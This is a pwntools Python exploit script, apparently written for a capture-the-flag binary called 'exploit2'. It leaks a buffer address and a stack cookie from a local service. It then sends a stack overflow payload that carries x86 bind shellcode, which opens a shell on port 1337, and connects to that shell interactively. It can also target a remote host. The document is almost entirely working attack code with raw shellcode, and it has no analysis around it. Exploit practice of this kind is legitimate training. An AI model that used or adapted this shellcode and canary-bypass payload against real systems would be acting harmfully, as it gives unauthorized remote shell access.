#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./exploit2"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        set follow-fork-mode child
		b *handle+232
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)
    p2 = remote("localhost", 31338)

buf_addr = u32(p2.recv(4))
cookie = u32(p2.recv(4))
log.info("buf address = 0x{:08x}".format(buf_addr))
log.info("cookie = 0x{:08x}".format(cookie))

# bind shellcode (port 1337)
shellcode_bind = b"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

payload = shellcode_bind
payload += p8(0x90) * (0x800 - len(payload))
payload += p32(cookie)
payload += p8(0x90) * 0xc
payload += p32(buf_addr)

p2.recvuntil("Insert your exploit here:")
sleep(0.5)
p2.sendline(payload)

p3 = remote("localhost", 1337)
p3.interactive()
